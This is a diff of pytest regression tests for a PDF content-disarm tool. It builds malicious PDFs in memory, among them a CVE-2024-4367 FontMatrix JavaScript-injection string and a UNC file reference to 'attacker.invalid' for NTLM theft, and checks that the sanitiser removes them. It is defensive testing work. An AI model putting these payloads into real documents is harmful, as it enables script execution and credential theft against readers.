@@ -5,6 +5,7 @@ Run: cd src && pytest test_cdr.py -v
 All fixtures are constructed in-memory — no external fixture files required.
 """
 
+import decimal
 import io
 import json
 import os
@@ -3322,6 +3323,348 @@ class TestStevensGapRegressions:
         # and the macro is still gone (sanity)
         names = zipfile.ZipFile(io.BytesIO(clean)).namelist()
         assert "word/vbaProject.bin" not in names
+
+
+class TestMaliciousPdfTaxonomyGaps:
+    """Regression coverage for PDF vectors drawn from the jonaslejon/malicious-pdf attack
+    taxonomy (tests 29-34) that the action/annotation sweeps did NOT reach. Each was
+    confirmed to survive cdr_pdf before the corresponding fix:
+
+      * catalog /Threads      — article beads hang off the catalog, not a page or action
+      * /FontMatrix           — CVE-2024-4367, JS injected via non-numeric matrix element
+      * stream /F file spec   — UNC path fetched on open (NTLM theft), no action object
+
+    No upstream code is reused; fixtures are built from the spec with reserved-invalid
+    hosts so nothing can phone home. See docs/fixtures/generate_fixtures.py for the
+    shareable variants."""
+
+    UNC = "\\\\attacker.invalid\\share\\steal"
+
+    # ── catalog /Threads article structure ──────────────────────────────────────
+    def _pdf_with_threads(self) -> bytes:
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        bead = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name("/Bead")))
+        thread = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Thread"), F=bead,
+            I=pikepdf.Dictionary(Title=pikepdf.String("THREADBEADMARKER")),
+        ))
+        pdf.Root["/Threads"] = pikepdf.Array([thread])
+        buf = io.BytesIO()
+        pdf.save(buf)
+        return buf.getvalue()
+
+    def test_catalog_threads_removed(self):
+        raw = self._pdf_with_threads()
+        assert b"THREADBEADMARKER" in raw  # precondition
+        clean, report = cdr.cdr_pdf(raw)
+        assert b"/Threads" not in clean, "catalog /Threads survived CDR"
+        assert b"THREADBEADMARKER" not in clean, "thread bead info survived CDR"
+        assert "/Threads" in report["removed"]
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            assert "/Threads" not in p.Root
+
+    def test_thread_action_on_openaction_removed(self):
+        # The /Thread *action* form is already covered by the catalog /OpenAction sweep —
+        # pin it so the two halves of the vector stay distinguishable in the report.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        pdf.Root["/OpenAction"] = pikepdf.Dictionary(
+            S=pikepdf.Name("/Thread"),
+            F=pikepdf.String("http://cdr.invalid/THREADFETCHMARKER"),
+        )
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"THREADFETCHMARKER" not in clean
+        assert "/OpenAction" in report["removed"]
+
+    def test_clean_pdf_reports_no_threads_removal(self):
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        buf = io.BytesIO()
+        pdf.save(buf)
+        _, report = cdr.cdr_pdf(buf.getvalue())
+        assert "/Threads" not in report["removed"]
+
+    # ── Type3 /FontMatrix JS injection (CVE-2024-4367) ──────────────────────────
+    def _pdf_with_fontmatrix(self, sixth) -> bytes:
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontBBox=pikepdf.Array([0, 0, 1, 1]),
+            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, sixth]),
+            CharProcs=pikepdf.Dictionary(a=charproc),
+            FirstChar=0, LastChar=0, Widths=pikepdf.Array([0]),
+        ))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        return buf.getvalue()
+
+    def test_fontmatrix_js_injection_neutralised(self):
+        raw = self._pdf_with_fontmatrix(
+            pikepdf.String("0);globalThis.FONTMATRIXPWNED=1;//"))
+        assert b"FONTMATRIXPWNED" in raw  # precondition
+        clean, report = cdr.cdr_pdf(raw)
+        assert b"FONTMATRIXPWNED" not in clean, "FontMatrix JS injection survived CDR"
+        assert any("/FontMatrix" in r for r in report["removed"])
+        # Output stays a valid PDF and the matrix is numeric again.
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            font = p.pages[0].Resources["/Font"]["/F1"]
+            matrix = list(font["/FontMatrix"])
+            assert len(matrix) == 6
+            for element in matrix:
+                assert isinstance(element, (int, float, decimal.Decimal)), \
+                    f"non-numeric /FontMatrix element survived: {element!r}"
+
+    def test_numeric_fontmatrix_left_alone(self):
+        # A legitimate Type3 font must not be touched — no false positive, and the
+        # font's own (non-default) geometry must be preserved exactly.
+        raw = self._pdf_with_fontmatrix(0.5)
+        clean, report = cdr.cdr_pdf(raw)
+        assert not any("/FontMatrix" in r for r in report["removed"])
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            matrix = list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])
+            assert float(matrix[5]) == 0.5, "legitimate /FontMatrix was rewritten"
+
+    def test_wrong_length_fontmatrix_reset(self):
+        # A 6-element array is required by the spec; a short one is malformed and is
+        # reset rather than trusted.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontMatrix=pikepdf.Array([0.001, 0, 0]),
+            CharProcs=pikepdf.Dictionary(),
+        ))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert any("/FontMatrix" in r for r in report["removed"])
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            assert len(list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])) == 6
+
+    # ── Audit findings: the /FontMatrix sweep must not be gated on /Subtype, and
+    #    a PDF boolean must not pass the numeric check (bool subclasses int) ──────
+    def _pdf_with_font_dict(self, extra: dict) -> bytes:
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
+                                      pikepdf.String("0);SUBTYPEBYPASS=1;//")]),
+            **extra,
+        ))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        return buf.getvalue()
+
+    @pytest.mark.parametrize("extra,label", [
+        ({"Type": pikepdf.Name("/Font"), "Subtype": pikepdf.Name("/Type1"),
+          "BaseFont": pikepdf.Name("/Helvetica")}, "Type1 font"),
+        ({"Type": pikepdf.Name("/Font"), "Subtype": pikepdf.Name("/TrueType")}, "TrueType font"),
+        ({"Type": pikepdf.Name("/Font")}, "font with no /Subtype"),
+        ({}, "bare dict with a /FontMatrix"),
+    ])
+    def test_fontmatrix_sweep_not_gated_on_subtype(self, extra, label):
+        # /Subtype is attacker-controlled: gating the sweep on /Type3 lets the same
+        # payload through by relabelling the font or omitting /Subtype entirely.
+        raw = self._pdf_with_font_dict(extra)
+        assert b"SUBTYPEBYPASS" in raw  # precondition
+        clean, report = cdr.cdr_pdf(raw)
+        assert b"SUBTYPEBYPASS" not in clean, \
+            f"/FontMatrix injection survived CDR via {label}"
+        assert any("/FontMatrix" in r for r in report["removed"])
+
+    def test_fontmatrix_boolean_element_reset(self):
+        # bool is a subclass of int in Python, so a naive isinstance(x, int) accepts a
+        # PDF boolean — which serialises as the bare token `true`, not a number.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, True]),
+            CharProcs=pikepdf.Dictionary(),
+        ))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert any("/FontMatrix" in r for r in report["removed"]), \
+            "boolean /FontMatrix element passed the numeric check"
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            matrix = list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])
+            for element in matrix:
+                assert not isinstance(element, bool), "boolean survived in /FontMatrix"
+
+    def test_fontmatrix_injection_in_objstm_removed(self):
+        # Object-stream packing must not hide the payload from the sweep.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        cp = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
+                                      pikepdf.String("0);OBJSTMPWNED=1;//")]),
+            CharProcs=pikepdf.Dictionary(a=cp)))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf, object_stream_mode=pikepdf.ObjectStreamMode.generate)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"OBJSTMPWNED" not in clean
+        assert any("/FontMatrix" in r for r in report["removed"])
+
+    def test_indirect_fontmatrix_array_removed(self):
+        # The array itself can be an indirect object rather than inline.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        cp = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+        matrix = pdf.make_indirect(pikepdf.Array(
+            [0.001, 0, 0, 0.001, 0, pikepdf.String("0);INDIRECTPWNED=1;//")]))
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontMatrix=matrix, CharProcs=pikepdf.Dictionary(a=cp)))
+        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"INDIRECTPWNED" not in clean
+        assert any("/FontMatrix" in r for r in report["removed"])
+
+    def test_indirect_threads_array_removed(self):
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        pdf.Root["/Threads"] = pdf.make_indirect(pikepdf.Array([
+            pdf.make_indirect(pikepdf.Dictionary(
+                Type=pikepdf.Name("/Thread"),
+                I=pikepdf.Dictionary(Title=pikepdf.String("INDIRECTTHREAD"))))]))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"INDIRECTTHREAD" not in clean
+        assert "/Threads" in report["removed"]
+
+    def test_embedded_file_stream_not_falsely_swept(self):
+        # The embedded-file *stream* has no /F of its own — the filename lives on the
+        # parent /Filespec. Confirm the external-ref sweep doesn't misreport here.
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        ef = pdf.make_stream(b"PAYLOAD")
+        ef[pikepdf.Name("/Type")] = pikepdf.Name("/EmbeddedFile")
+        fs = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Filespec"), F=pikepdf.String("a.txt"),
+            EF=pikepdf.Dictionary(F=pdf.make_indirect(ef))))
+        pdf.Root["/Names"] = pikepdf.Dictionary(EmbeddedFiles=pikepdf.Dictionary(
+            Names=pikepdf.Array([pikepdf.String("a.txt"), fs])))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"PAYLOAD" not in clean  # dropped with /Names./EmbeddedFiles
+        assert not any("external file ref" in r for r in report["removed"])
+
+    # ── UNC / external file specs on stream objects ─────────────────────────────
+    def _pdf_with_stream_file_ref(self, subtype: str) -> bytes:
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        stream = pdf.make_stream(b"q Q\n")
+        stream[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+        stream[pikepdf.Name("/Subtype")] = pikepdf.Name(subtype)
+        stream[pikepdf.Name("/BBox")] = pikepdf.Array([0, 0, 10, 10])
+        stream[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
+        stream[pikepdf.Name("/FFilter")] = pikepdf.Name("/FlateDecode")
+        pdf.pages[0].Resources = pikepdf.Dictionary(
+            XObject=pikepdf.Dictionary(X0=stream))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        return buf.getvalue()
+
+    def test_unc_form_xobject_file_ref_removed(self):
+        raw = self._pdf_with_stream_file_ref("/Form")
+        assert b"attacker.invalid" in raw  # precondition
+        clean, report = cdr.cdr_pdf(raw)
+        assert b"attacker.invalid" not in clean, "UNC stream /F survived CDR"
+        assert any("external file ref" in r for r in report["removed"])
+
+    def test_unc_file_ref_companions_removed(self):
+        # /FFilter and /FDecodeParms only have meaning alongside /F.
+        clean, _ = cdr.cdr_pdf(self._pdf_with_stream_file_ref("/Form"))
+        assert b"/FFilter" not in clean
+
+    def test_unc_image_xobject_file_ref_removed(self):
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        img = pdf.make_stream(b"\x00")
+        img[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+        img[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
+        img[pikepdf.Name("/Width")] = 1
+        img[pikepdf.Name("/Height")] = 1
+        img[pikepdf.Name("/BitsPerComponent")] = 8
+        img[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
+        img[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
+        pdf.pages[0].Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary(Im0=img))
+        buf = io.BytesIO()
+        pdf.save(buf)
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        assert b"attacker.invalid" not in clean, "UNC image /F survived CDR"
+        assert any("external file ref" in r for r in report["removed"])
+
+    def test_clean_pdf_reports_no_external_ref_removal(self):
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        buf = io.BytesIO()
+        pdf.save(buf)
+        _, report = cdr.cdr_pdf(buf.getvalue())
+        assert not any("external file ref" in r for r in report["removed"])
+
+    # ── all three combined, plus a /GoToR annotation action ─────────────────────
+    def test_combined_taxonomy_pdf_fully_disarmed(self):
+        pdf = pikepdf.Pdf.new()
+        pdf.add_blank_page()
+        pdf.Root["/Threads"] = pikepdf.Array([pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Thread"),
+            I=pikepdf.Dictionary(Title=pikepdf.String("MULTITHREADMARKER")),
+        ))])
+        charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
+        font = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
+            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
+                                      pikepdf.String("0);MULTIFONTPWNED=1;//")]),
+            CharProcs=pikepdf.Dictionary(a=charproc),
+        ))
+        img = pdf.make_stream(b"\x00")
+        img[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
+        img[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
+        img[pikepdf.Name("/Width")] = 1
+        img[pikepdf.Name("/Height")] = 1
+        img[pikepdf.Name("/BitsPerComponent")] = 8
+        img[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
+        img[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
+        pdf.pages[0].Resources = pikepdf.Dictionary(
+            Font=pikepdf.Dictionary(F1=font), XObject=pikepdf.Dictionary(Im0=img))
+        annot = pdf.make_indirect(pikepdf.Dictionary(
+            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Link"),
+            Rect=pikepdf.Array([0, 0, 10, 10]),
+            A=pikepdf.Dictionary(S=pikepdf.Name("/GoToR"),
+                                 F=pikepdf.String("GOTORMARKER")),
+        ))
+        pdf.pages[0].obj["/Annots"] = pikepdf.Array([annot])
+        buf = io.BytesIO()
+        pdf.save(buf)
+
+        clean, report = cdr.cdr_pdf(buf.getvalue())
+        for marker in (b"MULTITHREADMARKER", b"MULTIFONTPWNED",
+                       b"attacker.invalid", b"GOTORMARKER"):
+            assert marker not in clean, f"{marker.decode()} survived CDR"
+        assert "/Threads" in report["removed"]
+        assert any("/FontMatrix" in r for r in report["removed"])
+        assert any("external file ref" in r for r in report["removed"])
+        assert any("annot/A" in r for r in report["removed"])
+        with pikepdf.open(io.BytesIO(clean)) as p:
+            assert len(p.pages) == 1
 
 
 # ══════════════════════════════════════════════════════════════════════════════
